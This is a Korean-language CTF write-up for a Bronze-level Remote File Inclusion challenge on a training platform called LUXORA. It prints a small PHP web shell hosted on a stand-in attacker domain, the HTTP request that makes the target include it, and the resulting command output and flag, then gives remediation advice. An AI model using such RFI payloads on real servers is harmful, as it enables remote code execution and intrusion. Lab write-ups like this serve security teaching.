+++
title = "VulnABLE CTF [LUXORA] Write-up: RFI 🥉 Bronze"
description = "LUXORA 플랫폼의 기본 Remote File Inclusion (RFI) 취약점을 이용한 악성 웹 쉘 다운로드 및 실행 시나리오"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "RFI", "Bronze", "Web Shell", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: RFI 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: File & Resource Layer (RFI - Remote File Inclusion)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/rfi/bronze`
- **목표**: 서버가 사용자로부터 입력받은 URL을 검증 없이 그대로 다운로드하고 소스 코드로 포함(Include)하는 취약점을 악용하여, 해커 서버의 악성 코드를 타겟 서버에서 실행(RCE)시켜라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/rfi/bronze` 경로에 접근하면 외부 웹사이트의 URL을 입력받아 그 내용을 미리보기(Preview) 형식으로 보여주거나 스크립트로 불러오는 기능이 존재합니다.

**[정상 요청 테스트]**
```http
GET /rfi/bronze?url=http://example.com/test.txt HTTP/1.1
```

**[해커의 사고 과정]**
1. 이 애플리케이션은 파라미터 `url`에 적힌 외부 링크를 백엔드에서 HTTP 통신으로 가져와서 화면에 출력하거나 `include()` 함수로 실행하고 있다.
2. LFI(Local File Inclusion)가 내 컴퓨터(서버) 안의 파일을 훔쳐보는 것이라면, RFI는 아예 **외부에 있는 파일**을 끌고 들어와 실행시킬 수 있는 훨씬 위험한 취약점이다.
3. 내(해커) 서버에 악성 PHP 코드를 올려두고, 그 주소를 저 `url` 파라미터에 넣어보자!

---

## 💥 2. 취약점 식별 및 악성 스크립트 호스팅 (Exploitation)

RFI 공격을 성공시키려면 해커의 외부에 노출된 웹 서버가 필요합니다. 

### 💡 Step 1: 해커 서버에 악성 코드(Web Shell) 업로드
해커의 서버(`http://evil-attacker.com`)에 `shell.txt` (또는 `shell.php`) 파일을 생성합니다.

**[shell.txt 내용]**
```php
<?php
  // 서버에 흔적을 남기며, 시스템 명령어를 실행하는 간단한 코드
  echo "RFI Execution Success!<br>";
  system('id');
  system('cat flag_rfi_bronze.txt');
?>
```

*(참고: 확장자를 `.php`로 하면 해커 서버에서 코드가 실행된 후의 결과(HTML)만 넘어가게 될 수 있으므로, 타겟 서버에서 코드가 해석되게 하려면 단순 텍스트 확장자인 `.txt`를 사용하는 것이 확실합니다.)*

---

## 🚀 3. 공격 수행 및 결과 확인

이제 LUXORA 타겟 서버에게 방금 만든 해커 서버의 파일 주소를 던져줍니다.

### 페이로드 전송
```http
GET /rfi/bronze?url=http://evil-attacker.com/shell.txt HTTP/1.1
Host: localhost:3000
```

### 🔍 서버 내부의 동작
1. 타겟 서버(PHP 환경 가정)는 `include("http://evil-attacker.com/shell.txt");` 를 실행합니다.
2. 타겟 서버는 해커 서버로 접속하여 `shell.txt` 안의 텍스트(`<?php ... ?>`)를 다운로드합니다.
3. 타겟 서버는 다운로드한 텍스트를 단순 문자열이 아니라 **자신의 PHP 소스코드의 일부로 인식**하여 실행해버립니다!

### 🔍 서버의 응답
해커가 작성한 코드가 서버의 쉘(Shell) 권한으로 실행되어 그 결과가 반환됩니다.

```html
<div class="preview">
  RFI Execution Success!<br>
  uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>
  FLAG{RFI_🥉_REMOTE_EXEC_C4D5E6}
</div>
```

---

## 🚩 4. 롸잇업 결론 및 플래그

사용자 입력을 파일 인클루드 경로에 그대로 집어넣어, 타 도메인의 악성 스크립트를 서버 코어에 직접 주입(RCE)하는 가장 기초적이면서도 파괴적인 RFI 공격을 입증했습니다.

**🔥 획득한 플래그:**
`FLAG{RFI_🥉_REMOTE_EXEC_C4D5E6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
PHP 등 일부 언어에서 원격 URL을 파일 스트림처럼 열어서 `include` 하거나 `require` 할 수 있도록 허용한 기본 설정이 화근입니다.

* **안전한 패치 가이드 (설정 및 화이트리스트)**
1. **allow_url_include 끄기 (PHP)**
   서버의 `php.ini` 설정에서 원격 파일 인클루드 기능을 아예 비활성화해야 합니다. (이 설정만으로 RFI는 원천 차단됩니다)
   ```ini
   allow_url_fopen = On  ; (원격 파일 읽기는 허용하더라도)
   allow_url_include = Off ; (원격 파일을 코드로 실행하는 것은 절대 금지)
   ```
2. **도메인 화이트리스트 검증**
   기능상 반드시 외부 URL의 컨텐츠를 불러와야 한다면, 사전에 승인된 도메인(예: `https://api.trusted.com`)에서만 데이터를 가져오도록 엄격한 정규식이나 배열 기반의 화이트리스트 검사를 선행해야 합니다.